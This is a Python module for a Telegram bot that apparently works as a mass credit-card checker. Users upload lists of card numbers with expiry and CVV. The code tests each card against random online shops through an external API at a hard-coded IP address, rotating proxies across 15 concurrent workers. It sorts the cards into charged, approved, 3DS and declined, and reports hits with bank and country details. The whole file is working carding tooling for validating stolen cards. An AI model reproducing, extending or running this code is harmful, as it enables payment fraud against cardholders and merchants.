import asyncio
import html
import io
import os
import random
import re
import time

import aiohttp
from yarl import URL as _URL
from aiogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton, BufferedInputFile

from utils import icons as ic

_SPF_API     = "http://127.0.0.1:8000/check"
_EXT_API     = "http://104.214.171.212:3636/"
_USE_EXT_API = True

_CHARGED_KW  = ("ORDER_PLACED", "CHARGED", "SUCCESS", "THANK YOU", "PAYMENT SUCCESSFUL", "Order completed", "💎")
_APPROVED_KW = ("INSUFFICIENT_FUNDS", "INSUFFICIENT FUNDS", "INCORRECT_CVC",
                "INCORRECT CVC", "INCORRET_CVC")
_3DS_KW      = ("3DS", "3D SECURE", "VBV", "AUTHENTICATION", "OTP", "CHALLENGE")
_RETRY_KW    = ("API ERROR", "CART_FAIL", "NO_SIG", "NO_PRODUCT", "DELIVERY_NO_DELIVERY")

_sessions: dict = {}

def _classify(resp_upper: str) -> str:
    if any(k in resp_upper for k in _CHARGED_KW):  return "CHARGED"
    if any(k in resp_upper for k in _APPROVED_KW): return "APPROVED"
    if any(k in resp_upper for k in _3DS_KW):      return "3DS"
    if any(k in resp_upper for k in _RETRY_KW) or not resp_upper.strip():
        return "RETRY"
    return "DECLINED"

def _load_sites(base_dir: str) -> list:
    path = os.path.join(base_dir, "sites.txt")
    try:
        with open(path, 'r', encoding='utf-8', errors='ignore') as f:
            return [ln.strip() for ln in f if ln.strip().startswith('http')]
    except Exception:
        return []

async def _call_ext(card: str, site: str, proxy: str = None) -> dict:
    try:
        qs = f"?{card}&url={site}"
        if proxy: qs += f"&proxy={proxy}"
        url = _EXT_API.rstrip('/') + '/' + qs
        timeout = aiohttp.ClientTimeout(total=120)
        async with aiohttp.ClientSession() as sess:
            async with sess.get(_URL(url, encoded=True), timeout=timeout) as r:
                data = await r.json(content_type=None)
        if not isinstance(data, dict):
            return {"resp": "", "price": "", "site": site, "order_url": ""}
        resp = str(data.get("Response") or "")
        if str(data.get("Charged","")).lower() == "true": resp = "ORDER_PLACED"
        price = str(data.get("Price") or "")
        return {
            "resp":      resp,
            "price":     price,
            "site":      str(data.get("Site") or site),
            "order_url": "",
        }
    except Exception:
        return {"resp": "", "price": "", "site": site, "order_url": ""}

async def _call_api(card: str, site: str, proxy: str = None) -> dict:
    if _USE_EXT_API:
        result = await _call_ext(card, site, proxy)
        if result['resp']:
            return result
        return await _call_spf(card, site, proxy)
    return await _call_spf(card, site, proxy)

async def _call_spf(card: str, site: str, proxy: str = None) -> dict:
    params = {"card": card, "site": site}
    if proxy:
        params["proxy"] = proxy
    try:
        timeout = aiohttp.ClientTimeout(total=90)
        async with aiohttp.ClientSession() as sess:
            async with sess.get(_SPF_API, params=params, timeout=timeout) as r:
                data = await r.json(content_type=None)
        if not isinstance(data, dict):
            return {"resp": "", "price": "", "site": site, "order_url": ""}
        return {
            "resp":      str(data.get("response") or data.get("message") or data.get("status") or ""),
            "price":     str(data.get("price") or ""),
            "site":      str(data.get("site") or site),
            "order_url": str(data.get("order_url") or ""),
        }
    except Exception:
        return {"resp": "", "price": "", "site": site, "order_url": ""}

def _progress_kb(msg_id: int) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text=" Pause",  callback_data=f"spf_pause_{msg_id}", style='success', icon_custom_emoji_id='5116116063188157350'),
            InlineKeyboardButton(text=" Resume", callback_data=f"spf_resume_{msg_id}", style='success', icon_custom_emoji_id='5116517977637782262'),
        ],
        [InlineKeyboardButton(text=" Stop", callback_data=f"spf_stop_{msg_id}", style='danger', icon_custom_emoji_id='5116444615301399317')],
    ])

def setup(ctx) -> tuple:
    is_admin          = ctx['is_admin']
    get_user_proxies  = ctx['get_user_proxies']
    add_user_proxies  = ctx['add_user_proxies']
    remove_user_proxy = ctx['remove_user_proxy']
    load_shopify_data = ctx['load_shopify_data']
    save_shopify_data = ctx['save_shopify_data']
    check_proxy_via_ip= ctx['check_proxy_via_ip']
    parse_all_cards   = ctx['parse_all_cards']
    parse_bin_info    = ctx['parse_bin_info']
    bot               = ctx['bot']
    BASE_DIR          = ctx['BASE_DIR']

    async def cmd_cc(message: Message):
        uid   = message.from_user.id
        fname = html.escape(message.from_user.first_name or 'User')

        raw  = re.sub(r'^/cc(@\w+)?\s*', '', (message.text or '').strip(),
                      flags=re.IGNORECASE).strip()
        cards = parse_all_cards(raw)
        if not cards and message.reply_to_message:
            t = (message.reply_to_message.text or
                 message.reply_to_message.caption or '').strip()
            cards = parse_all_cards(t)
        if not cards:
            await message.reply(
                f"{ic.WARN} <b>Usage:</b> <code>/cc cc|mm|yy|cvv</code>")
            return

        card = cards[0]

        sites = _load_sites(BASE_DIR)
        if not sites:
            await message.reply(
                f"{ic.FAIL} <b>sites.txt is empty.</b> Ask admin to add sites.")
            return

        proxies = get_user_proxies(uid)
        if not proxies:
            await message.reply(
                f"{ic.FAIL} <b>No proxies!</b> Add with "
                f"<code>/addproxy\nip:port:user:pass</code>.")
            return

        site  = random.choice(sites)
        proxy = random.choice(proxies)

        s = await message.reply(ic.premium_emoji(
            f"<b>⚡🤤 ㅤ#𝓜𝔃𝓵 𝔁 𝓒𝓱𝓬𝓴𝓮𝓻  🤤⚡</b>\n"
            f"<b>━━━━━━━━━━━━━━━━━</b>\n"
            f"<b>⚡💠 𝐂𝐡𝐞𝐜𝐤𝐢𝐧𝐠...</b>\n"
            f"<blockquote>💳 𝗖𝗮𝗿𝗱: <code>{html.escape(card)}</code></blockquote>\n"
            f"<b>━━━━━━━━━━━━━━━━━</b>"
        ))

        result = await _call_api(card, site, proxy)
        resp, price, r_site = result['resp'], result['price'], result['site']
        status = _classify(resp.upper())

        bin_line, issuer, country_line = await asyncio.to_thread(
            parse_bin_info, card)

        if status == "CHARGED":
            st_line = "💸 <b>𝐂𝐡𝐚𝐫𝐠𝐞𝐝</b>"
        elif status == "APPROVED":
            st_line = "✅ <b>𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱</b>"
        elif status == "3DS":
            st_line = "🔐 <b>𝟯𝗗𝗦</b>"
        elif status == "RETRY":
            st_line = "⚠️ <b>Retry / Site Error</b>"
        else:
            st_line = "❌ <b>𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱</b>"

        price_line  = f"<blockquote>💰 𝗣𝗿𝗶𝗰𝗲: {html.escape(price)}</blockquote>\n" if price else ""

        text = ic.premium_emoji(
            f"<b>⚡🤤 ㅤ#𝓜𝔃𝓵 𝔁 𝓒𝓱𝓬𝓴𝓮𝓻 🤤⚡</b>\n"
            f"<b>━━━━━━━━━━━━━━━━━</b>\n"
            f"<b>⚡💠 𝐑𝐞𝐬𝐮𝐥𝐭</b>\n"
            f"<blockquote>{st_line}</blockquote>\n"
            f"<blockquote>💳 𝗖𝗮𝗿𝗱: <code>{html.escape(card)}</code></blockquote>\n"
            f"<blockquote>📝 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲: {html.escape(resp[:150]) if resp else 'No Response'}</blockquote>\n"
            f"{price_line}"
            f"<b>━━━━━━━━━━━━━━━━━</b>\n"
            f"<b>🎯💠 𝐁𝐈𝐍 𝐈𝐧𝐟𝐨</b>\n"
            f"<pre>𝗕𝗜𝗡: {html.escape(bin_line)}\n"
            f"𝗕𝗮𝗻𝗸: {html.escape(issuer)}\n"
            f"𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {html.escape(country_line)}</pre>\n"
            f"<b>━━━━━━━━━━━━━━━━━</b>\n"
            f"🥶 <b>𝗨𝘀𝗲𝗿: <a href='tg://user?id={uid}'>{fname}</a></b>"
        )
        try:
            await s.edit_text(text)
        except Exception:
            await message.reply(text)

    async def cmd_ran(message: Message):
        uid   = message.from_user.id
        fname = html.escape(message.from_user.first_name or 'User')

        if any(v['uid'] == uid for v in _sessions.values()):
            await message.reply(
                f"{ic.WARN} <b>You already have a running session.</b> "
                f"Press 🛑 Stop to cancel it first.")
            return

        sites = _load_sites(BASE_DIR)
        if not sites:
            await message.reply(
                f"{ic.FAIL} <b>sites.txt is empty.</b> Ask admin to add sites.")
            return

        proxies = get_user_proxies(uid)
        if len(proxies) < 5:
            await message.reply(
                f"{ic.FAIL} <b>Need at least 5 proxies!</b> "
                f"You have: <b>{len(proxies)}</b>. Use <code>/addproxy</code> to add more.")
            return

        doc = None
        if message.reply_to_message and message.reply_to_message.document:
            doc = message.reply_to_message.document
        elif message.document:
            doc = message.document

        if not doc:
            await message.reply(
                f"{ic.WARN} <b>Reply to a .txt file containing a CC list.</b>")
            return
        if not (doc.file_name or '').lower().endswith('.txt'):
            await message.reply(f"{ic.WARN} <b>Only .txt files accepted.</b>")
            return

        if doc.file_size > 2 * 1024 * 1024:
            await message.reply(ic.premium_emoji("⚠️ <b>File too large. Max 2MB.</b>"))
            return

        s = await message.reply(ic.premium_emoji("🔄 <b>Loading file...</b>"))

        try:
            file_bytes = await bot.download(doc)
            content    = file_bytes.read().decode('utf-8', errors='ignore')
            cards      = parse_all_cards(content)
        except Exception as e:
            await s.edit_text(ic.premium_emoji(f"❌ <b>Error loading file:</b> <code>{html.escape(str(e))}</code>"))
            return

        if not cards:
            await s.edit_text(
                f"{ic.FAIL} <b>No valid cards found in file.</b>")
            return

        cards = list(dict.fromkeys(cards))
        if len(cards) > 3000:
            cards = cards[:3000]

        total = len(cards)
        await s.edit_text(
            ic.premium_emoji(
                f"<b>⚡🤤 ㅤ#𝓜𝔃𝓵 𝔁 𝓒𝓱𝓬𝓴𝓮𝓻  🤤⚡</b>\n"
                f"<b>━━━━━━━━━━━━━━━━━</b>\n"
                f"<b>⚡💠 𝐏𝐫𝐨𝐠𝐫𝐞𝐬𝐬</b>\n"
                f"<blockquote>🤤 𝗧𝗼𝘁𝗮𝗹: {total}</blockquote>\n"
                f"<blockquote>💸 𝗖𝗵𝗮𝗿𝗴𝗲𝗱: 0\n"
                f"✅ 𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱: 0\n"
                f"🔐 𝟯𝗗𝗦: 0\n"
                f"❌ 𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱: 0</blockquote>\n"
                f"<blockquote>💠 𝗖𝗵𝗲𝗰𝗸𝗲𝗱: 0/{total}</blockquote>\n"
                f"<blockquote>⏱️ 𝗧𝗶𝗺𝗲: 0h 0m 0s</blockquote>\n"
                f"<b>━━━━━━━━━━━━━━━━━</b>"
            ),
            reply_markup=_progress_kb(s.message_id)
        )

        session_id = f"{uid}_{s.message_id}"
        _sessions[session_id] = {
            'uid':     uid,
            'fname':   fname,
            'paused':  False,
            'stopped': False,
            'charged': [],
            'approved':[],
            '3ds':     [],
            'dead':    [],
            'checked': 0,
            'total':   total,
            'start':   time.time(),
        }

        asyncio.create_task(
            _run_mass(uid, fname, s, session_id, cards, sites, proxies))

    async def _run_mass(uid, fname, s, session_id, cards, sites, proxies):
        sess          = _sessions.get(session_id)
        if not sess:
            return
        last_update   = [time.time()]
        queue         = asyncio.Queue()

        for c in cards:
            queue.put_nowait((c, 0))

        async def worker():
            while True:
                try:
                    card, retry_n = queue.get_nowait()
                except asyncio.QueueEmpty:
                    return
                if sess.get('stopped'):
                    queue.task_done()
                    return
                while sess.get('paused') and not sess.get('stopped'):
                    await asyncio.sleep(0.5)

                site  = random.choice(sites)
                proxy = random.choice(proxies)

                result = await _call_api(card, site, proxy)
                if sess.get('stopped'):
                    queue.task_done()
                    return
                resp   = result['resp']
                status = _classify(resp.upper())

                if status == "RETRY":
                    if not resp.strip() and retry_n < 3:
                        await asyncio.sleep(2.0 * (retry_n + 1))
                        queue.put_nowait((card, retry_n + 1))
                        queue.task_done()
                        continue
                    if resp.strip() and retry_n < 1:
                        queue.put_nowait((card, retry_n + 1))
                        queue.task_done()
                        await asyncio.sleep(0.5)
                        continue

                sess['checked'] += 1
                dead_resp = resp if resp.strip() else "NO_RESPONSE"
                if status == "CHARGED":
                    sess['charged'].append((card, result))
                    asyncio.create_task(
                        _send_hit(uid, fname, card, result, "CHARGED"))
                elif status == "APPROVED":
                    sess['approved'].append((card, result))
                    asyncio.create_task(
                        _send_hit(uid, fname, card, result, "APPROVED"))
                elif status == "3DS":
                    sess['3ds'].append((card, result))
                else:
                    sess['dead'].append((card, dead_resp))

                queue.task_done()

                now = time.time()
                if not sess.get('stopped') and now - last_update[0] >= 1.0:
                    last_update[0] = now
                    asyncio.create_task(_update_progress(s, sess))

        workers = [asyncio.create_task(worker()) for _ in range(15)]
        while workers:
            if sess.get('stopped'):
                for w in workers:
                    if not w.done():
                        w.cancel()
                break
            done, pending = await asyncio.wait(workers, timeout=1.0)
            workers = list(pending)

        if session_id in _sessions:
            del _sessions[session_id]

        await _send_final(s, sess, uid)

    async def _send_hit(uid, fname, card, result, status):
        try:
            resp   = result['resp']
            price  = result['price']
            r_site = result['site']
            if status == "CHARGED":
                st_text = "𝐂𝐡𝐚𝐫𝐠𝐞𝐝"
                emoji   = "💸"
            else:
                st_text = "𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝"
                emoji   = "✅"
            price_line = f"<blockquote>💰 𝗣𝗿𝗶𝗰𝗲: {html.escape(price)}</blockquote>\n" if price else ""
            bin_line, issuer, country_line = await asyncio.to_thread(parse_bin_info, card)
            text = ic.premium_emoji(
                f"<b>⚡🤤 ㅤ#𝓜𝔃𝓵 𝔁 𝓒𝓱𝓬𝓴𝓮𝓻  🤤⚡</b>\n"
                f"<b>━━━━━━━━━━━━━━━━━</b>\n"
                f"<b>🌱 𝐇𝐢𝐭 𝐅𝐨𝐮𝐧𝐝!</b>\n"
                f"<blockquote>{emoji} 𝗦𝘁𝗮𝘁𝘂𝘀: {st_text}</blockquote>\n"
                f"<blockquote>💳 𝗖𝗮𝗿𝗱: <code>{html.escape(card)}</code></blockquote>\n"
                f"<blockquote>📝 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲: {html.escape(resp[:150]) if resp else 'No Response'}</blockquote>\n"
                f"{price_line}"
                f"<b>━━━━━━━━━━━━━━━━━</b>\n"
                f"<b>🎯😁 𝐁𝐈𝐍 𝐈𝐧𝐟𝐨</b>\n"
                f"<pre>𝗕𝗜𝗡: {html.escape(bin_line)}\n"
                f"𝗕𝗮𝗻𝗸: {html.escape(issuer)}\n"
                f"𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {html.escape(country_line)}</pre>\n"
                f"<b>━━━━━━━━━━━━━━━━━</b>\n"
                f"🥶 <b>𝗨𝘀𝗲𝗿: <a href='tg://user?id={uid}'>{fname}</a></b>"
            )
            await bot.send_message(uid, text)
        except Exception:
            pass

    async def _update_progress(s, sess):
        try:
            ch  = len(sess['charged'])
            ap  = len(sess['approved'])
            tds = len(sess['3ds'])
            dd  = len(sess['dead'])
            ck  = sess['checked']
            tt  = sess['total']
            el  = int(time.time() - sess['start'])
            m, sec = divmod(el, 60)
            h, m   = divmod(m, 60)
            await s.edit_text(
                ic.premium_emoji(
                    f"<b>⚡🤤 ㅤ#𝓜𝔃𝓵 𝔁 𝓒𝓱𝓬𝓴𝓮𝓻  🤤⚡</b>\n"
                    f"<b>━━━━━━━━━━━━━━━━━</b>\n"
                    f"<b>⚡💠 𝐏𝐫𝐨𝐠𝐫𝐞𝐬𝐬</b>\n"
                    f"<blockquote>🤤 𝗧𝗼𝘁𝗮𝗹: {tt}</blockquote>\n"
                    f"<blockquote>💸 𝗖𝗵𝗮𝗿𝗴𝗲𝗱: {ch}\n"
                    f"✅ 𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱: {ap}\n"
                    f"🔐 𝟯𝗗𝗦: {tds}\n"
                    f"❌ 𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱: {dd}</blockquote>\n"
                    f"<blockquote>📊 𝗖𝗵𝗲𝗰𝗸𝗲𝗱: {ck}/{tt}</blockquote>\n"
                    f"<blockquote>⏱️ 𝗧𝗶𝗺𝗲: {h}𝗵 {m}𝗺 {sec}𝘀</blockquote>\n"
                    f"<b>━━━━━━━━━━━━━━━━━</b>"
                ),
                reply_markup=_progress_kb(s.message_id)
            )
        except Exception:
            pass

    async def _send_final(s, sess, uid):
        ch  = len(sess['charged'])
        ap  = len(sess['approved'])
        tds = len(sess['3ds'])
        dd  = len(sess['dead'])
        ck  = sess['checked']
        tt  = sess['total']
        el  = int(time.time() - sess['start'])
        m, sec = divmod(el, 60)
        h, m   = divmod(m, 60)

        hits_lines = ""
        for card, r in sess['charged'][:10]:
            price_tag = f" — {html.escape(r['price'])}" if r.get('price') else ""
            hits_lines += f"💸 <code>{html.escape(card)}</code>{price_tag}\n"
        for card, r in sess['approved'][:10]:
            hits_lines += f"✅ <code>{html.escape(card)}</code>\n"
        for card, r in sess['3ds'][:10]:
            hits_lines += f"🔐 <code>{html.escape(card)}</code>\n"
        if not hits_lines:
            hits_lines = "No hits 🙁"

        summary = ic.premium_emoji(
            f"<b>⚡🤤 ㅤ#𝓜𝔃𝓵 𝔁 𝓒𝓱𝓬𝓴𝓮𝓻  🤤⚡</b>\n"
            f"<b>━━━━━━━━━━━━━━━━━</b>\n"
            f"<b>⚡💠 𝐑𝐞𝐬𝐮𝐥𝐭𝐬</b>\n"
            f"<blockquote>🤤 𝗧𝗼𝘁𝗮𝗹: {tt} </blockquote>\n"
            f"<blockquote>💸 𝗖𝗵𝗮𝗿𝗴𝗲𝗱: {ch} \n"
            f"✅ 𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱: {ap} \n"
            f"🔐 𝟯𝗗𝗦: {tds} \n"
            f"❌ 𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱: {dd} </blockquote>\n"
            f"<blockquote>📊 𝗖𝗵𝗲𝗰𝗸𝗲𝗱: {ck}/{tt}</blockquote>\n"
            f"<blockquote>⏱️ 𝗧𝗶𝗺𝗲: {h}𝗵 {m}𝗺 {sec}𝘀</blockquote>\n"
            f"<b>━━━━━━━━━━━━━━━━━</b>\n"
            f"<b>🎯 𝗛𝗶𝘁𝘀</b>\n"
            f"<blockquote>{hits_lines}</blockquote>\n"
            f"<b>━━━━━━━━━━━━━━━━━</b>"
        )

        try:
            await s.delete()
        except Exception:
            pass

        lines = []
        if sess['charged']:
            lines.append("=== CHARGED ===")
            for card, r in sess['charged']:
                price_part = f" | {r['price']}" if r.get('price') else ""
                lines.append(f"{card} | {r['resp']}{price_part}")
        if sess['approved']:
            lines.append("=== APPROVED ===")
            for card, r in sess['approved']:
                lines.append(f"{card} | {r['resp']}")
        if sess['3ds']:
            lines.append("=== 3DS ===")
            for card, r in sess['3ds']:
                lines.append(f"{card} | {r['resp']}")
        if sess.get('dead'):
            lines.append("=== DECLINED ===")
            for card, resp in sess['dead']:
                lines.append(f"{card} | {resp}")

        buf = io.BytesIO("\n".join(lines).encode('utf-8'))
        doc = BufferedInputFile(buf.getvalue(), filename=f"results_{uid}.txt")
        safe_caption = (
            f"📊 Results\n"
            f"Total: {tt} | Charged: {ch} | Approved: {ap} | 3DS: {tds} | Declined: {dd}\n"
            f"Checked: {ck}/{tt} | Time: {h}h {m}m {sec}s"
        )
        try:
            await bot.send_document(uid, doc, caption=safe_caption)
        except Exception:
            pass

        try:
            await bot.send_message(uid, summary[:4090])
        except Exception:
            pass

    async def cb_spf(call: CallbackQuery):
        data = call.data
        uid  = call.from_user.id

        if data.startswith("spf_pause_"):
            msg_id = data[len("spf_pause_"):]
            sid    = f"{uid}_{msg_id}"
            if sid in _sessions:
                _sessions[sid]['paused'] = True
                await call.answer("⏸️ Paused")
            else:
                await call.answer("Session not found.")

        elif data.startswith("spf_resume_"):
            msg_id = data[len("spf_resume_"):]
            sid    = f"{uid}_{msg_id}"
            if sid in _sessions:
                _sessions[sid]['paused'] = False
                await call.answer("▶️ Resumed")
            else:
                await call.answer("Session not found.")

        elif data.startswith("spf_stop_"):
            msg_id = data[len("spf_stop_"):]
            sid    = f"{uid}_{msg_id}"
            if sid in _sessions:
                _sessions[sid]['stopped'] = True
                await call.answer("🛑 Stopping...")
                try:
                    await call.message.edit_text(
                        "🛑 <b>Stop signal sent. Finishing up...</b>")
                except Exception:
                    pass
            else:
                await call.answer("Session not found.")
        else:
            await call.answer()

    async def cmd_addproxy(message: Message):
        uid   = message.from_user.id
        lines = (message.text or '').split('\n')
        proxy_text = '\n'.join(lines[1:]).strip()
        if not proxy_text:
            await message.reply(
                f"{ic.WARN} <b>Usage:</b>\n"
                f"<code>/addproxy\n"
                f"ip:port:user:pass\n"
                f"ip:port:user:pass</code>")
            return
        raw_lines = [ln.strip() for ln in proxy_text.split() if ln.strip()]
        valid = []
        rejected = []
        for p in raw_lines:
            if len(p.split(':')) < 4:
                rejected.append(p)
            else:
                valid.append(p)
        if rejected:
            rej_list = "\n".join(f"<code>{html.escape(r)}</code>" for r in rejected[:5])
            await message.reply(
                f"{ic.FAIL} <b>Proxy ip:port is not accepted.</b>\n"
                f"Required: <code>ip:port:user:pass</code>\n\n"
                f"❌ Rejected:\n{rej_list}")
            if not valid:
                return
        current = get_user_proxies(uid)
        slots   = 30 - len(current)
        if slots <= 0:
            await message.reply(
                f"{ic.FAIL} <b>Proxy limit reached (30/30).</b> "
                f"Use <code>/delproxy</code> or <code>/clearproxy</code> to free up slots.")
            return
        trimmed_lines = valid[:slots]
        added_n, _ = add_user_proxies(uid, ' '.join(trimmed_lines))
        total_now  = len(get_user_proxies(uid))
        if added_n == 0:
            await message.reply(f"{ic.WARN} All proxies already exist. ({total_now}/30)")
        else:
            await message.reply(f"✅ <b>Added {added_n} proxy/proxies! ({total_now}/30)</b>")

    async def cmd_delproxy(message: Message):
        uid  = message.from_user.id
        args = (message.text or '').split(maxsplit=1)
        if len(args) < 2:
            await message.reply(
                f"{ic.WARN} <b>Usage:</b> <code>/delproxy 1</code> (index number)")
            return
        ok = remove_user_proxy(uid, args[1].strip())
        if ok:
            await message.reply("✅ <b>Proxy removed.</b>")
        else:
            await message.reply(f"{ic.FAIL} Proxy not found.")

    async def cmd_proxylist(message: Message):
        uid     = message.from_user.id
        proxies = get_user_proxies(uid)
        if not proxies:
            await message.reply(f"{ic.FAIL} <b>No proxies yet.</b>")
            return
        lines = "\n".join(
            f"{i+1}. <code>{html.escape(p)}</code>"
            for i, p in enumerate(proxies)
        )
        await message.reply(
            f"<b>📋 Your proxies ({len(proxies)}):</b>\n\n{lines}")

    async def cmd_clearproxy(message: Message):
        uid  = message.from_user.id
        data = load_shopify_data()
        key  = str(uid)
        if key not in data or not data[key].get('proxies'):
            await message.reply(f"{ic.FAIL} <b>No proxies to clear.</b>")
            return
        data[key]['proxies'] = []
        save_shopify_data(data)
        await message.reply("✅ <b>All proxies cleared.</b>")

    async def cmd_checkproxy(message: Message):
        uid     = message.from_user.id
        proxies = get_user_proxies(uid)
        if not proxies:
            await message.reply(f"{ic.FAIL} <b>No proxies yet.</b>")
            return
        s = await message.reply(
            f"🔄 <b>Checking {len(proxies)} proxies...</b>")
        results = await asyncio.gather(
            *[asyncio.to_thread(check_proxy_via_ip, p) for p in proxies],
            return_exceptions=True
        )
        alive = [proxies[i] for i, r in enumerate(results)
                 if not isinstance(r, Exception) and r[1]]
        dead  = [proxies[i] for i, r in enumerate(results)
                 if isinstance(r, Exception) or not r[1]]

        data = load_shopify_data()
        key  = str(uid)
        if key in data:
            data[key]['proxies'] = alive
            save_shopify_data(data)

        text = (
            f"✅ <b>Alive: {len(alive)}</b>  ❌ <b>Dead: {len(dead)}</b>\n"
            f"<i>Dead proxies have been removed from your list.</i>"
        )
        if alive:
            preview = "\n".join(
                f"<code>{html.escape(p)}</code>" for p in alive[:10])
            text += f"\n\n<b>Alive:</b>\n{preview}"
            if len(alive) > 10:
                text += f"\n<i>... and {len(alive)-10} more</i>"
        await s.edit_text(text)

    commands = {
        'cc':         cmd_cc,
        'ran':        cmd_ran,
        'addproxy':   cmd_addproxy,
        'delproxy':   cmd_delproxy,
        'proxylist':  cmd_proxylist,
        'clearproxy': cmd_clearproxy,
        'checkproxy': cmd_checkproxy,
    }
    callbacks = [('spf_', cb_spf)]
    return commands, callbacks
